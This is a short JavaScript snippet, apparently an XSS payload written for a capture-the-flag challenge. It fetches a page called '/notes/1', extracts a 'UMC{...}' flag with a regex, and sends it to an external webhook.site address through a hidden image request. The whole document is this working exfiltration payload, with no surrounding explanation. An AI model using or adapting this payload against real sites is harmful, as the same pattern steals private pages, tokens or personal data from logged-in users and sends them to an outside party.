(async () => {
  const r = await fetch('/notes/1');             // flag note
  const html = await r.text();
  const flag = /UMC\w+\{[^}]+}/.exec(html)[0];   // simple regex
  new Image().src = 'https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?f=' + encodeURIComponent(flag);
})();
